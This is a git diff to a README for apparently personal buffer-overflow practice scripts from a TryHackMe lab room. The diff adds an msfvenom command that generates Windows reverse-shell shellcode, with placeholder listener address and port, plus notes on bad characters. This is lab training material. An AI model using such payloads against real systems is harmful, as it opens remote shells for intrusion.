@@ -4,6 +4,10 @@ Each folder numbered from 1 to x contains the scripts from fuzzing to the stage 
 
 Buffer overflow Room can be Found at:--> https://tryhackme.com/room/bufferoverflowprep
 
+**command used for shellcode generation to Fit with scripts**
+
+msfvenom -p windows/shell_reverse_tcp LHOST=<The-Listening-ip> LPORT=<Listening-port> -f py -b "<badChars-specific-to-overflow>" EXITFUNC=thread -v shellcode
+
 # OVERFLOW 1
 
 **Bad Chars:--> \x00\x07\x2e\xa0**
@@ -20,4 +24,6 @@ Buffer overflow Room can be Found at:--> https://tryhackme.com/room/bufferoverfl
 
 # NOTE
 
+  *The badChars scripts present in each overflow contain a badChars variable from which also badchars specific to the overflow have been eliminated* 
+  
 **Other Overflows will be added as I do them**
